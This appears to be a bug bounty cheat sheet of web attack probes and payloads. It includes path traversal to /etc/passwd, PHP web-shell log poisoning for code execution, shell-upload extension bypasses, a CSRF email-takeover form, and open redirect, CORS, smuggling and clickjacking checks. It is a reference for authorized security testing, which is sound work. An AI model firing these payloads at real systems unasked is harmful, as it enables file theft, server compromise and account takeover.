# Bug Bounty — Web App Vulnerabilities

### Directory traversal / LFI probe

```
https://<target>/page?file=../../../../etc/passwd
https://<target>/page?file=....//....//....//etc/passwd
```

**Use when:** A parameter takes a filename/path — testing for local file inclusion.

---

### LFI to RFI/RCE via log poisoning

```
curl -A "<?php system(\$_GET['cmd']); ?>" https://<target>/
https://<target>/page?file=/var/log/apache2/access.log&cmd=id
```

**Use when:** Confirmed LFI, and you control something the server logs (e.g. User-Agent).

---

### File upload bypass — extension trick

```
shell.php.jpg
shell.php%00.jpg
shell.phtml
```

**Use when:** An upload form filters by extension — testing common blacklist bypass tricks.

---

### CSRF PoC (minimal HTML)

```
<form action="https://<target>/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

**Use when:** A state-changing request lacks a CSRF token — building a PoC to demonstrate impact.

---

### Open redirect probe

```
https://<target>/redirect?url=https://evil.com
```

**Use when:** A redirect parameter isn't validated against an allowlist.

---

### CORS misconfiguration test

```
curl -s -H "Origin: https://evil.com" -I https://<target>/api/data
```

**Use when:** Checking if `Access-Control-Allow-Origin` reflects an arbitrary origin (especially with credentials allowed).

---

### HTTP request smuggling probe (Burp/manual)

```
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Use when:** Front-end/back-end server pair might disagree on request boundaries — a Burp extension (HTTP Request Smuggler) is the practical way to test this at scale.

---

### Test for clickjacking

```
curl -sI https://<target> | grep -i "x-frame-options\|content-security-policy"
```

**Use when:** Checking whether a sensitive page can be framed for a clickjacking attack.
